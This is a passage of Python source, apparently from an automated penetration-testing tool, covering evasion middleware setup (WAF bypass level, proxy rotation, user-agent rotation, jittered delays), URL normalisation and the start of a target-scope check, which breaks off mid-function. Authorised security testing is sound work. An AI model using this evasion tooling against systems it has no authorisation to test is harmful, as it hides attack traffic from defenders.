def _get_evasion_middleware():
    """Lazy-load evasion middleware to avoid circular imports.
    Returns None if evasion is disabled."""
    cfg = settings.effective()
    if not getattr(cfg, "evasion_enabled", False):
        return None
    try:
        from autopnex.evasion.evasion_middleware import EvasionMiddleware, EvasionConfig
        config = EvasionConfig(
            enabled=cfg.evasion_enabled,
            bypass_level=getattr(cfg, "waf_bypass_level", "none"),
            proxy_list=[
                p.strip()
                for p in getattr(cfg, "evasion_proxy_list", "").split(",")
                if p.strip()
            ],
            waf_auto_detect=getattr(cfg, "evasion_waf_auto_detect", True),
            base_delay=getattr(cfg, "evasion_base_delay", 0.3),
            jitter_pct=getattr(cfg, "evasion_jitter_pct", 0.3),
            ua_rotation=getattr(cfg, "evasion_ua_rotation", True),
        )
        return EvasionMiddleware(config)
    except ImportError:
        return None


def _default_headers() -> Dict[str, str]:
    middleware = _get_evasion_middleware()
    if middleware and middleware.config.enabled:
        return middleware.rate_controller.get_rotated_headers()
    cfg = settings.effective()
    return {
        "User-Agent": cfg.user_agent,
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
    }


def normalise_target(target: str) -> str:
    if not target:
        return target
    if "://" not in target:
        target = "http://" + target
    return target.rstrip("/")


def parsed(target: str) -> Tuple[str, str, int]:
    t = normalise_target(target)
    p = urlparse(t)
    scheme = p.scheme or "http"
    host = p.hostname or ""
    port = p.port or (443 if scheme == "https" else 80)
    return scheme, host, port


class TargetScopeError(RuntimeError):
    pass


def ensure_target_allowed(target: str, *, runtime_config: Optional[RuntimeConfig] = None) -> str:
    runtime = runtime_config or settings.effective()
    normalised = normalise_target(target)
    host = urlparse(normalised).hostname or ""
    if not host:
        raise TargetScopeError("invalid_target")
    if runtime.allow_local_targets:
        return normalised
